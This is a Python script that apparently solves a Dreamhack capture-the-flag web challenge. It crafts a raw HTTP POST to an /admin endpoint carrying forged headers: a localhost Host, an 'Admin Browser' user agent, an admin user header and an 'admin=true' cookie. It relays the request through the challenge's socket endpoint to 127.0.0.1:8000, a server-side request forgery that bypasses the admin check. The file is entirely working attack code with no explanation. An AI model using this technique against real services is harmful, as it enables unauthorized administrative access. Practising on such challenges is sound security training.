import requests

port = 23300
url_index = f"http://host3.dreamhack.games:{port}/"
url_admin = url_index + "admin"
url_socket = url_index + "socket"

EOL = "\r\n"
data = "userid=admin"
header_format = {
    "HOST": "127.0.0.1",
    "Connection": "keep-alive",
    "User-Agent": "Admin Browser",
    "DreamhackUser": "admin",
    "Cookie": "admin=true",
    "Content-length": f"{len(data)}",
    "Content-type": "application/x-www-form-urlencoded; charset=UTF-8",
}
header = f"POST {url_admin} HTTP/1.1" + EOL
for key in header_format:
    header += key + ": " + header_format[key] + EOL
header += EOL
request = header + data

param = {"host": "127.0.0.1", "port": 8000, "data": request}

print(request)
r = requests.post(url_socket, data=param)
print(r.text)
